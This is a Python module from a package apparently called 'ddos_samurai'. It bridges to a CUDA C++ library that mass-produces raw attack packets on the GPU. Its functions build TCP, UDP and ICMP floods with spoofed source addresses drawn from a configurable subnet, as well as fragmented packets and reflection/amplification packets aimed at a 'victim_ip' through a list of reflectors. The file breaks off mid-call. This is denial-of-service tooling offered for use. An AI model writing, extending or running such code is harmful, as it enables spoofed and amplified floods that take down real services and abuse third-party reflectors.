"""CUDA C++ backend bridge for ``ddos_samurai.gpu_packet``.

This module keeps API parity with ``gpu_packet_legacy`` and provides an
optional native path via ``libgpu_packet_cuda.so`` C ABI.
"""

from __future__ import annotations

import ctypes
import contextlib
import os
import sys
import threading
from pathlib import Path
from typing import Any

import numpy as np

try:
    from . import gpu_packet_legacy as _legacy
    _LEGACY_IMPORT_ERROR: Exception | None = None
except ModuleNotFoundError as exc:
    _LEGACY_IMPORT_ERROR = exc

    class _LegacyShim:
        class GPUPacketError(RuntimeError):
            pass

        class GPUMemoryError(GPUPacketError):
            pass

        cp = np

        def __getattr__(self, name: str):
            raise ModuleNotFoundError(
                "gpu_packet_legacy is unavailable (missing optional CUDA Python "
                f"dependencies): {_LEGACY_IMPORT_ERROR}"
            ) from _LEGACY_IMPORT_ERROR

    _legacy = _LegacyShim()


_LIB_PATH = Path(__file__).with_name("libgpu_packet_cuda.so")
_NATIVE_ENV = "SAMURAI_GPU_PACKET_CUDA_CPP_NATIVE"
_NATIVE_POLICY_ENV = "SAMURAI_GPU_PACKET_NATIVE_POLICY"


def _env_flag(name: str, default: str = "0") -> bool:
    raw = str(os.environ.get(name, default) or default).strip().lower()
    return raw in {"1", "true", "yes", "on"}


_NATIVE_ENABLED = _env_flag(_NATIVE_ENV, "1")


def _normalize_native_policy(raw: str | None) -> str:
    val = str(raw or "allow").strip().lower()
    aliases = {
        "strict": "require",
        "required": "require",
        "fail": "require",
        "off": "allow",
        "auto": "allow",
    }
    norm = aliases.get(val, val)
    if norm in {"allow", "require"}:
        return norm
    return "allow"


_NATIVE_POLICY = _normalize_native_policy(os.environ.get(_NATIVE_POLICY_ENV, "allow"))
_HOST_INPUT_CACHE: dict[tuple[int, str, str, int], np.ndarray] = {}
_HOST_INPUT_CACHE_LOCK = threading.Lock()
_NATIVE_GENERATION_TELEMETRY_KEYS = (
    "gpu_native_h2d_copy_count",
    "gpu_native_h2d_copy_bytes",
    "gpu_native_d2h_copy_count",
    "gpu_native_d2h_copy_bytes",
    "gpu_native_host_pack_copy_count",
    "gpu_native_host_pack_copy_bytes",
)
_NATIVE_GENERATION_TELEMETRY_LOCK = threading.Lock()
_NATIVE_GENERATION_TELEMETRY: dict[str, int] = {
    k: 0 for k in _NATIVE_GENERATION_TELEMETRY_KEYS
}


def _native_telemetry_inc(key: str, delta: int = 1) -> None:
    if key not in _NATIVE_GENERATION_TELEMETRY:
        return
    with _NATIVE_GENERATION_TELEMETRY_LOCK:
        _NATIVE_GENERATION_TELEMETRY[key] = int(_NATIVE_GENERATION_TELEMETRY.get(key, 0)) + int(delta)


def _native_telemetry_snapshot() -> dict[str, int]:
    with _NATIVE_GENERATION_TELEMETRY_LOCK:
        return {k: int(_NATIVE_GENERATION_TELEMETRY.get(k, 0)) for k in _NATIVE_GENERATION_TELEMETRY_KEYS}


def _native_telemetry_reset() -> None:
    with _NATIVE_GENERATION_TELEMETRY_LOCK:
        for key in _NATIVE_GENERATION_TELEMETRY_KEYS:
            _NATIVE_GENERATION_TELEMETRY[key] = 0


def _native_track_h2d_copy(nbytes: int) -> None:
    if int(nbytes) <= 0:
        return
    _native_telemetry_inc("gpu_native_h2d_copy_count", 1)
    _native_telemetry_inc("gpu_native_h2d_copy_bytes", int(nbytes))


def _native_track_d2h_copy(nbytes: int) -> None:
    if int(nbytes) <= 0:
        return
    _native_telemetry_inc("gpu_native_d2h_copy_count", 1)
    _native_telemetry_inc("gpu_native_d2h_copy_bytes", int(nbytes))


def _native_track_host_pack_copy(nbytes: int) -> None:
    if int(nbytes) <= 0:
        return
    _native_telemetry_inc("gpu_native_host_pack_copy_count", 1)
    _native_telemetry_inc("gpu_native_host_pack_copy_bytes", int(nbytes))


def _load_lib() -> ctypes.CDLL | None:
    if not _LIB_PATH.exists():
        return None
    try:
        lib = ctypes.CDLL(str(_LIB_PATH))
    except Exception:
        return None

    lib.samurai_gpu_packet_generate_packets.argtypes = [
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_int64,  # target_port
        ctypes.c_char_p,  # protocol
        ctypes.c_int,  # spoof_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int64,  # tcp_flags
        ctypes.c_int,  # has_ethernet
        ctypes.c_int64,  # window
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_packets_from_template.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # template_bytes
        ctypes.c_size_t,  # template_len
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int,  # spoof_ip
        ctypes.c_int,  # has_ethernet
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.c_int,  # force_global_fallback
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_packets_from_template.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_packets_from_template_pool.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # templates_flat
        ctypes.c_size_t,  # templates_flat_len
        ctypes.c_int64,  # packet_size
        ctypes.c_int64,  # num_templates
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int,  # spoof_ip
        ctypes.c_int64,  # specific_src_port
        ctypes.c_int,  # has_ethernet
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.c_int,  # force_global_fallback
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_packets_from_template_pool.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_stateful_packets.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # templates_flat
        ctypes.c_size_t,  # templates_flat_len
        ctypes.c_int64,  # packet_size
        ctypes.c_int64,  # num_templates
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_int,  # spoof_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int64,  # specific_src_port
        ctypes.c_int,  # has_ethernet
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.POINTER(ctypes.c_uint32),  # seq_list
        ctypes.c_size_t,  # seq_len
        ctypes.POINTER(ctypes.c_uint32),  # ack_list
        ctypes.c_size_t,  # ack_len
        ctypes.POINTER(ctypes.c_uint8),  # state_list
        ctypes.c_size_t,  # state_len
        ctypes.POINTER(ctypes.c_uint32),  # actual_lengths
        ctypes.c_size_t,  # actual_lengths_len
        ctypes.POINTER(ctypes.c_uint16),  # window_sizes
        ctypes.c_size_t,  # window_sizes_len
        ctypes.POINTER(ctypes.c_uint16),  # mss_values
        ctypes.c_size_t,  # mss_values_len
        ctypes.POINTER(ctypes.c_uint8),  # ttls
        ctypes.c_size_t,  # ttls_len
        ctypes.c_int,  # force_global_fallback
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_stateful_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_fragmented_packets.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # payload_bytes
        ctypes.c_size_t,  # payload_len
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_int64,  # target_port
        ctypes.c_char_p,  # protocol
        ctypes.c_int,  # spoof_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int,  # has_ethernet
        ctypes.c_int64,  # frag1_size
        ctypes.c_int64,  # frag2_size
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_fragmented_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_amplification_packets.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # template_bytes
        ctypes.c_size_t,  # template_len
        ctypes.POINTER(ctypes.c_char_p),  # reflectors_ips
        ctypes.c_size_t,  # reflectors_count
        ctypes.c_char_p,  # victim_ip
        ctypes.c_int64,  # count
        ctypes.c_int,  # has_ethernet
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_amplification_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_icmp_packets.argtypes = [
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int,  # spoof_ip
        ctypes.c_int,  # has_ethernet
        ctypes.c_int64,  # icmp_type
        ctypes.c_int64,  # icmp_code
        ctypes.c_int64,  # payload_size
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_icmp_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_free.argtypes = [ctypes.c_void_p]
    lib.samurai_gpu_packet_free.restype = None

    lib.samurai_gpu_packet_last_error.argtypes = []
    lib.samurai_gpu_packet_last_error.restype = ctypes.c_char_p
    return lib


_LIB = _load_lib()


_SYNC_SYMBOLS = [
    "cp",
    "create_xoroshiro128p_states",
    "template_kernel",
    "pool_kernel",
    "stateful_pool_kernel",
    "create_tcp_packets_kernel_spoof",
    "create_tcp_packets_kernel_nospoof",
    "create_udp_packets_kernel_spoof",
    "create_udp_packets_kernel_nospoof",
    "create_icmp_packets_kernel",
    "create_fragmented_packets_kernel",
    "amplification_kernel_v2",
]


def _safe_legacy_getattr(name: str, default: Any = None):
    try:
        return getattr(_legacy, name)
    except Exception:
        return default


# Preserve original legacy symbol bindings so facade monkeypatching can
# deterministically disable native path even if sync helpers overwrite legacy.
_LEGACY_BASE_SYMBOLS = {
    name: _safe_legacy_getattr(name, None)
    for name in _SYNC_SYMBOLS
}


def _sync_facade_patches_to_legacy() -> None:
    facade = sys.modules.get("ddos_samurai.gpu_packet")
    if facade is None:
        return
    for name in _SYNC_SYMBOLS:
        if hasattr(facade, name):
            try:
                setattr(_legacy, name, getattr(facade, name))
            except Exception:
                pass


@contextlib.contextmanager
def _temporary_synced_legacy_symbols():
    """Temporarily mirror facade monkeypatches onto legacy symbols.

    Tests patch symbols on ``ddos_samurai.gpu_packet``. Legacy calls should
    observe those patches, but mutations must not leak into subsequent tests.
    """
    facade = sys.modules.get("ddos_samurai.gpu_packet")
    if facade is None:
        yield
        return

    previous = {}
    for name in _SYNC_SYMBOLS:
        if not hasattr(facade, name):
            continue
        previous[name] = _safe_legacy_getattr(name, None)
        try:
            setattr(_legacy, name, getattr(facade, name))
        except Exception:
            pass

    try:
        yield
    finally:
        for name, value in previous.items():
            try:
                setattr(_legacy, name, value)
            except Exception:
                pass


def _call_legacy(name: str, *args, **kwargs):
    if _LEGACY_IMPORT_ERROR is not None:
        raise ModuleNotFoundError(
            "Legacy CUDA Python backend is unavailable because optional "
            f"dependencies are missing: {_LEGACY_IMPORT_ERROR}"
        ) from _LEGACY_IMPORT_ERROR
    with _temporary_synced_legacy_symbols():
        return getattr(_legacy, name)(*args, **kwargs)


def _last_error() -> str:
    if _LIB is None:
        return ""
    try:
        raw = _LIB.samurai_gpu_packet_last_error()
    except Exception:
        return ""
    if not raw:
        return ""
    try:
        return raw.decode("utf-8", errors="replace").strip()
    except Exception:
        return str(raw)


def _as_bytes(value: Any, default: str = "") -> bytes:
    if value is None:
        return default.encode("utf-8")
    if isinstance(value, bytes):
        return value
    return str(value).encode("utf-8")


def _cached_host_array(cache_name: str, dtype: np.dtype, size: int) -> np.ndarray:
    key = (int(threading.get_ident()), str(cache_name), np.dtype(dtype).str, int(size))
    with _HOST_INPUT_CACHE_LOCK:
        arr = _HOST_INPUT_CACHE.get(key)
        if arr is None:
            arr = np.empty((int(size),), dtype=dtype)
            _HOST_INPUT_CACHE[key] = arr
        return arr


def _coerce_numeric_array(data: Any, dtype, *, cache_name: str | None = None) -> np.ndarray | None:
    if data is None:
        return None
    want = np.dtype(dtype)
    if isinstance(data, np.ndarray):
        arr = np.ravel(data)
        if arr.dtype != want:
            arr = arr.astype(want, copy=False)
        if arr.flags.c_contiguous:
            return arr
        out = _cached_host_array(cache_name or "numeric", want, int(arr.size))
        out[: arr.size] = arr
        return out[: arr.size]
    if want == np.dtype(np.uint8) and isinstance(data, memoryview):
        view = data if data.itemsize == 1 else data.cast("B")
        arr = np.frombuffer(view, dtype=np.uint8)
        if arr.flags.c_contiguous:
            return arr
    if want == np.dtype(np.uint8) and isinstance(data, (bytes, bytearray)):
        return np.frombuffer(data, dtype=np.uint8)
    arr = np.asarray(data, dtype=want).reshape(-1)
    if arr.flags.c_contiguous and cache_name is None:
        return arr
    if arr.flags.c_contiguous and isinstance(data, np.ndarray):
        return arr
    out = _cached_host_array(cache_name or "numeric", want, int(arr.size))
    out[: arr.size] = arr
    return out[: arr.size]


class _NativeHostAllocation:
    __slots__ = ("_ptr", "_lib", "_lock", "_released")

    def __init__(self, ptr: ctypes.c_void_p, lib):
        self._ptr = ctypes.c_void_p(int(ptr.value or 0))
        self._lib = lib
        self._lock = threading.Lock()
        self._released = False

    def release(self) -> None:
        with self._lock:
            if self._released:
                return
            self._released = True
            if self._lib is not None and bool(self._ptr):
                try:
                    self._lib.samurai_gpu_packet_free(self._ptr)
                except Exception:
                    pass

    def __del__(self):
        self.release()


class _NativeHostArray(np.ndarray):
    pass


def _wrap_host_array(out_ptr: ctypes.c_void_p, out_size: int, *, pool_key: str) -> np.ndarray:
    del pool_key
    size = int(out_size)
    if size <= 0:
        return np.empty((0,), dtype=np.uint8)
    if not bool(out_ptr):
        raise _legacy.GPUMemoryError("cuda_cpp backend returned null pointer with non-zero size")
    owner = _NativeHostAllocation(out_ptr, _LIB)
    buf_type = ctypes.c_uint8 * size
    buf = buf_type.from_address(int(out_ptr.value))
    arr = np.ctypeslib.as_array(buf).view(_NativeHostArray)
    arr._owner = owner
    arr._ctypes_buf = buf
    return arr


def _raise_native_error(default_message: str):
    msg = (_last_error() or default_message or "cuda_cpp native call failed").strip()
    lower = msg.lower()
    if any(
        tok in lower
        for tok in (
            "must not",
            "invalid",
            "too small",
            "unaligned",
            "mismatch",
            "same size",
            "exceed",
            "empty",
            "unsupported",
            "must be",
            ">= 0",
        )
    ):
        raise ValueError(msg)
    raise _legacy.GPUPacketError(msg)


def _materialize_native_output(
    out_ptr: ctypes.c_void_p,
    out_size: int,
    *,
    pool_key: str,
    return_host_ready: bool = False,
):
    _native_track_d2h_copy(int(out_size))
    host = _wrap_host_array(out_ptr, out_size, pool_key=pool_key)
    if return_host_ready:
        return host
    try:
        out = _legacy.cp.asarray(host, dtype=_legacy.cp.uint8)
    except Exception:
        return host
    if isinstance(out, np.ndarray):
        return host
    owner = getattr(host, "_owner", None)
    if owner is not None and hasattr(owner, "release"):
        owner.release()
        host._owner = None
    return out


def _flatten_templates(templates_bytes_list):
    if not templates_bytes_list:
        return np.empty((0,), dtype=np.uint8), 0, 0
    first = _coerce_numeric_array(
        templates_bytes_list[0],
        np.uint8,
        cache_name="template:first",
    )
    packet_size = int(first.size)
    if packet_size <= 0:
        return np.empty((0,), dtype=np.uint8), 0, int(len(templates_bytes_list))
    num_templates = int(len(templates_bytes_list))
    flat = _cached_host_array("templates_flat", np.uint8, packet_size * num_templates)
    flat[:packet_size] = first[:packet_size]
    for i, tpl_in in enumerate(templates_bytes_list[1:], start=1):
        tpl = _coerce_numeric_array(
            tpl_in,
            np.uint8,
            cache_name=f"template:{i}",
        )
        if int(tpl.size) != packet_size:
            raise ValueError(
                f"All templates must be same size! Template {i} is {int(tpl.size)} bytes, expected {packet_size}"
            )
        start = i * packet_size
        flat[start : start + packet_size] = tpl[:packet_size]
    _native_track_host_pack_copy(int(packet_size * num_templates))
    return flat[: packet_size * num_templates], packet_size, num_templates


def _array_ptr(arr: np.ndarray | None, ptr_type):
    if arr is None or int(arr.size) == 0:
        return None, 0
    return arr.ctypes.data_as(ptr_type), int(arr.size)


def _native_ready() -> bool:
    if _LIB is None or not _NATIVE_ENABLED:
        return False
    # Test doubles (non-ctypes libraries) should not be gated by facade patch checks.
    if not isinstance(_LIB, ctypes.CDLL):
        return True
    facade = sys.modules.get("ddos_samurai.gpu_packet")
    if facade is None:
        return True
    for name in _SYNC_SYMBOLS:
        if not hasattr(facade, name):
            continue
        # Compare against original legacy bindings (not mutable current values)
        # so sync calls done by compatibility helpers do not re-enable native.
        if getattr(facade, name) is not _LEGACY_BASE_SYMBOLS.get(name):
            return False
    return True


def is_available() -> bool:
    return _LIB is not None


def is_native_path_enabled() -> bool:
    return bool(_NATIVE_ENABLED)


def is_native_library_available() -> bool:
    return bool(_LIB is not None)


def is_native_path_active() -> bool:
    return bool(_native_ready())


def get_native_policy() -> str:
    return str(_NATIVE_POLICY)


def is_native_policy_require() -> bool:
    return str(_NATIVE_POLICY) == "require"


def _fallback_to_legacy_allowed() -> bool:
    return not is_native_policy_require()


def _extract_stream_handle(stream: Any) -> int | None:
    if stream is None:
        return 0
    if isinstance(stream, (int, np.integer)):
        h = int(stream)
        return h if h >= 0 else None
    for attr in ("ptr", "cuda_stream", "handle"):
        if hasattr(stream, attr):
            try:
                h = int(getattr(stream, attr))
                return h if h >= 0 else None
            except Exception:
                pass
    nested = getattr(stream, "stream", None)
    if nested is not None and nested is not stream:
        return _extract_stream_handle(nested)
    return None


def _resolve_stream_handle(op_name: str, stream) -> int:
    h = _extract_stream_handle(stream)
    if h is not None:
        return int(h)
    if not _fallback_to_legacy_allowed():
        _raise_native_policy_violation(
            op_name,
            stream=stream,
            reason_override="stream object cannot be converted to cudaStream_t handle",
        )
    return -1


def _raise_native_policy_violation(op_name: str, *, stream=None, reason_override: str | None = None):
    if reason_override:
        reason = reason_override
    elif _LIB is None:
        reason = "native library unavailable"
    elif not _NATIVE_ENABLED:
        reason = "native path disabled by env"
    elif stream is not None:
        reason = "streamed native call is unsupported"
    else:
        reason = "native path not ready"
    raise _legacy.GPUPacketError(
        f"cuda_cpp native policy=require: {op_name} cannot fallback to legacy ({reason})"
    )


def init_gpu():
    return _call_legacy("init_gpu")


def generate_packets(
    count,
    target_ip,
    target_port,
    protocol="tcp",
    spoof_ip=True,
    real_src_ip="192.168.1.100",
    tcp_flags=0x02,
    has_ethernet=True,
    window=-1,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    return_host_ready=False,
):
    stream_handle = _resolve_stream_handle("generate_packets", stream)
    if not _native_ready() or stream_handle < 0:
        if not _fallback_to_legacy_allowed():
            _raise_native_policy_violation("generate_packets", stream=stream)
        return _call_legacy(
            "generate_packets",
            count,
            target_ip,
            target_port,
            protocol=protocol,
            spoof_ip=spoof_ip,
            real_src_ip=real_src_ip,
            tcp_flags=tcp_flags,
            has_ethernet=has_ethernet,
            window=window,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
        )

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_packets(
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_int64(int(target_port)),
        ctypes.c_char_p(_as_bytes(protocol, "tcp")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int64(int(tcp_flags)),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_int64(int(window)),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_packets failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_packets",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def generate_packets_from_template(
    template_bytes,
    count,
    real_src_ip="192.168.1.100",
    spoof_ip=True,
    has_ethernet=True,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    force_global_fallback=False,
    return_host_ready=False,
):
    stream_handle = _resolve_stream_handle("generate_packets_from_template", stream)
    if not _native_ready() or stream_handle < 0:
        if not _fallback_to_legacy_allowed():
            _raise_native_policy_violation("generate_packets_from_template", stream=stream)
        return _call_legacy(
            "generate_packets_from_template",
            template_bytes,
            count,
            real_src_ip=real_src_ip,
            spoof_ip=spoof_ip,
            has_ethernet=has_ethernet,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
            force_global_fallback=force_global_fallback,
        )

    template_arr = _coerce_numeric_array(
        template_bytes,
        np.uint8,
        cache_name="generate_packets_from_template:template",
    )
    if template_arr is None or int(template_arr.size) <= 0:
        raise ValueError("template_bytes must not be empty")
    tpl_ptr, tpl_len = _array_ptr(template_arr, ctypes.POINTER(ctypes.c_uint8))
    _native_track_h2d_copy(int(tpl_len))
    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)

    rc = _LIB.samurai_gpu_packet_generate_packets_from_template(
        tpl_ptr,
        ctypes.c_size_t(tpl_len),
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.c_int(1 if force_global_fallback else 0),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_packets_from_template failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_packets_from_template",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def generate_packets_from_template_pool(
    templates_bytes_list,
    count,
    target_ip,
    real_src_ip="192.168.1.100",
    spoof_ip=True,
    specific_src_port=-1,
    has_ethernet=True,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    force_global_fallback=False,
    return_host_ready=False,
):
    stream_handle = _resolve_stream_handle("generate_packets_from_template_pool", stream)
    if not _native_ready() or stream_handle < 0:
        if not _fallback_to_legacy_allowed():
            _raise_native_policy_violation("generate_packets_from_template_pool", stream=stream)
        return _call_legacy(
            "generate_packets_from_template_pool",
            templates_bytes_list,
            count,
            target_ip,
            real_src_ip=real_src_ip,
            spoof_ip=spoof_ip,
            specific_src_port=specific_src_port,
            has_ethernet=has_ethernet,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
            force_global_fallback=force_global_fallback,
        )

    flat, packet_size, num_templates = _flatten_templates(templates_bytes_list)
    if num_templates == 0:
        return None, 0

    flat_ptr, flat_len = _array_ptr(flat, ctypes.POINTER(ctypes.c_uint8))
    _native_track_h2d_copy(int(flat_len))
    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)

    rc = _LIB.samurai_gpu_packet_generate_packets_from_template_pool(
        flat_ptr,
        ctypes.c_size_t(flat_len),
        ctypes.c_int64(packet_size),
        ctypes.c_int64(num_templates),
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_int64(int(specific_src_port)),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.c_int(1 if force_global_fallback else 0),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_packets_from_template_pool failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_packets_from_template_pool",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def generate_fragmented_packets(
    payload_bytes,
    count,
    target_ip,
    target_port,
    protocol="udp",
    spoof_ip=True,
    real_src_ip="192.168.1.100",
    has_ethernet=True,
    frag1_size=1500,
    frag2_size=1500,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    return_host_ready=False,
):
    stream_handle = _resolve_stream_handle("generate_fragmented_packets", stream)
    if not _native_ready() or stream_handle < 0:
        if not _fallback_to_legacy_allowed():
            _raise_native_policy_violation("generate_fragmented_packets", stream=stream)
        return _call_legacy(
            "generate_fragmented_packets",
            payload_bytes,
            count,
            target_ip,
            target_port,
            protocol=protocol,
            spoof_ip=spoof_ip,
            real_src_ip=real_src_ip,
            has_ethernet=has_ethernet,
            frag1_size=frag1_size,
            frag2_size=frag2_size,
            stream=stream,
            gateway_mac=gateway_mac,
            spoof_subnet=spoof_subnet,
        )

    payload_arr = _coerce_numeric_array(
        payload_bytes,
        np.uint8,
        cache_name="generate_fragmented_packets:payload",
    )
    payload_ptr, payload_len = _array_ptr(payload_arr, ctypes.POINTER(ctypes.c_uint8))
    _native_track_h2d_copy(int(payload_len))

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_fragmented_packets(
        payload_ptr,
        ctypes.c_size_t(payload_len),
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_int64(int(target_port)),
        ctypes.c_char_p(_as_bytes(protocol, "udp")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_int64(int(frag1_size)),
        ctypes.c_int64(int(frag2_size)),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_fragmented_packets failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_fragmented_packets",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def generate_amplification_packets(
    template_bytes,
    reflectors_ips,
    victim_ip,
    count,
    has_ethernet=True,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    return_host_ready=False,
):
    stream_handle = _resolve_stream_handle("generate_amplification_packets", stream)
    if not _native_ready() or stream_handle < 0:
        if not _fallback_to_legacy_allowed():
            _raise_native_policy_violation("generate_amplification_packets", stream=stream)
        return _call_legacy(
            "generate_amplification_packets",
            template_bytes,
            reflectors_ips,
            victim_ip,
            count,
            has_ethernet=has_ethernet,
            stream=stream,
            gateway_mac=gateway_mac,
        )

    if not reflectors_ips:
        raise ValueError("reflectors_ips must not be empty")

    template_arr = _coerce_numeric_array(
        template_bytes,
        np.uint8,
        cache_name="generate_amplification_packets:template",
    )
    if template_arr is None or int(template_arr.size) <= 0:
        raise ValueError("template_bytes must not be empty")
    tpl_ptr, tpl_len = _array_ptr(template_arr, ctypes.POINTER(ctypes.c_uint8))
    _native_track_h2d_copy(int(tpl_len))

    reflector_bytes = [_as_bytes(ip) for ip in reflectors_ips]
    reflectors_arr = (ctypes.c_char_p * len(reflector_bytes))(*reflector_bytes)

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_amplification_packets(
        tpl_ptr,
        ctypes.c_size_t(tpl_len),
        reflectors_arr,
        ctypes.c_size_t(len(reflector_bytes)),
        ctypes.c_char_p(_as_bytes(victim_ip)),
        ctypes.c_int64(int(count)),
        ctypes.c_int(1 if has_ethernet else 0),
